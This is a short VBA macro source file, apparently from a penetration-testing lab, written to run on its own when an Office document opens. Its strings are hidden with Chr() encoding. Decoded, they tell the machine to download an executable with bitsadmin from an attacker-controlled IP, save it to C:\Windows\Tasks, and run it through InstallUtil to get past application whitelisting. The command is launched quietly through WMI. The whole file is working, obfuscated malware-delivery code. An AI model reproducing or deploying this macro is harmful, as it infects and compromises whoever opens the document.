Sub AutoOpen()
    ' Fruited strings (ASCII -> decimal Chr() obfuscation).
    ' Regenerate when you change the IP: edit vbagen.py -> `python3 vbagen.py`
    ' -> paste the a/b/c/d lines here.
    Dim a As String
    a = Chr(105) & Chr(110) & Chr(102) & Chr(111) & Chr(46) & Chr(100) & Chr(111) & Chr(99)  ' info.doc

    Dim b As String
    b = Chr(99) & Chr(109) & Chr(100) & Chr(32) & Chr(47) & Chr(99) & Chr(32) & Chr(34) & Chr(98) & Chr(105) & Chr(116) & Chr(115) & Chr(97) & Chr(100) & Chr(109) & Chr(105) & Chr(110) & Chr(32) _
     & Chr(47) & Chr(84) & Chr(114) & Chr(97) & Chr(110) & Chr(115) & Chr(102) & Chr(101) & Chr(114) & Chr(32) & Chr(106) & Chr(111) & Chr(98) & Chr(53) & Chr(32) & Chr(47) & Chr(100) & Chr(111) _
     & Chr(119) & Chr(110) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(32) & Chr(47) & Chr(112) & Chr(114) & Chr(105) & Chr(111) & Chr(114) & Chr(105) & Chr(116) & Chr(121) & Chr(32) & Chr(70) _
     & Chr(79) & Chr(82) & Chr(69) & Chr(71) & Chr(82) & Chr(79) & Chr(85) & Chr(78) & Chr(68) & Chr(32) & Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(49) _
     & Chr(57) & Chr(50) & Chr(46) & Chr(49) & Chr(54) & Chr(56) & Chr(46) & Chr(52) & Chr(53) & Chr(46) & Chr(49) & Chr(55) & Chr(55) & Chr(47) & Chr(73) & Chr(110) & Chr(115) & Chr(116) _
     & Chr(97) & Chr(108) & Chr(108) & Chr(85) & Chr(116) & Chr(105) & Chr(108) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(119) & Chr(105) & Chr(110) _
     & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(116) & Chr(97) & Chr(115) & Chr(107) & Chr(115) & Chr(92) & Chr(114) & Chr(117) & Chr(110) & Chr(46) & Chr(101) & Chr(120) & Chr(101) _
     & Chr(32) & Chr(38) & Chr(38) & Chr(32) & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(77) & Chr(105) & Chr(99) _
     & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(46) & Chr(78) & Chr(69) & Chr(84) & Chr(92) & Chr(70) & Chr(114) & Chr(97) & Chr(109) & Chr(101) & Chr(119) & Chr(111) _
     & Chr(114) & Chr(107) & Chr(54) & Chr(52) & Chr(92) & Chr(118) & Chr(52) & Chr(46) & Chr(48) & Chr(46) & Chr(51) & Chr(48) & Chr(51) & Chr(49) & Chr(57) & Chr(92) & Chr(105) & Chr(110) _
     & Chr(115) & Chr(116) & Chr(97) & Chr(108) & Chr(108) & Chr(117) & Chr(116) & Chr(105) & Chr(108) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(32) & Chr(47) & Chr(108) & Chr(111) & Chr(103) _
     & Chr(102) & Chr(105) & Chr(108) & Chr(101) & Chr(61) & Chr(32) & Chr(47) & Chr(76) & Chr(111) & Chr(103) & Chr(84) & Chr(111) & Chr(67) & Chr(111) & Chr(110) & Chr(115) & Chr(111) & Chr(108) _
     & Chr(101) & Chr(61) & Chr(102) & Chr(97) & Chr(108) & Chr(115) & Chr(101) & Chr(32) & Chr(47) & Chr(85) & Chr(32) & Chr(67) & Chr(58) & Chr(92) & Chr(119) & Chr(105) & Chr(110) & Chr(100) _
     & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(116) & Chr(97) & Chr(115) & Chr(107) & Chr(115) & Chr(92) & Chr(114) & Chr(117) & Chr(110) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(34)  ' full cmd

    Dim c As String
    c = Chr(119) & Chr(105) & Chr(110) & Chr(109) & Chr(103) & Chr(109) & Chr(116) & Chr(115) & Chr(58)  ' winmgmts:

    Dim d As String
    d = Chr(87) & Chr(105) & Chr(110) & Chr(51) & Chr(50) & Chr(95) & Chr(80) & Chr(114) & Chr(111) & Chr(99) & Chr(101) & Chr(115) & Chr(115)  ' Win32_Process

    ' Use WMI to execute the command (b) stealthily (no visible cmd window)
    Dim objWMIService As Object
    Set objWMIService = GetObject(c & "\root\cimv2")
    Dim objProcess As Object
    Set objProcess = objWMIService.Get(d)
    objProcess.Create b, Null, Null, Null
End Sub
